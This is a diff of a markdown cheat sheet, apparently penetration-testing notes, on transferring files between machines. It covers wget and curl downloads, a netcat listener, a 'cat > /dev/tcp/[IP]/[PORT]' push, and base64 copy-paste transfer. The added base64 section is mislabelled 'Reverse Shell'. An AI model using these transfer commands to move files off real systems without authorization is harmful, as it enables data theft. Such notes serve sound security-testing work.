@@ -14,7 +14,7 @@ wget [URL] -O [OUTPUT FILE]
 ```
 curl -o [OUTPUT FILE] [URL]
 ```
-## NC
+## Netcat
 ### Source Machine
 ```
 nc -nvlp [PORT] > [OUTPUT FILE]
@@ -22,4 +22,14 @@ nc -nvlp [PORT] > [OUTPUT FILE]
 ### Destination Machine
 ```
 cat [FILE NAME] > /dev/tcp/[IP]/[PORT]
+```
+## Reverse Shell
+### Source Machine
+#### Copy Content
+```
+cat [FILE] | base64 -w 0; echo
+```
+### Destination Machine
+```
+echo [CLIPBOARD] | base64 -d > [OUTPUT FILE]
 ```
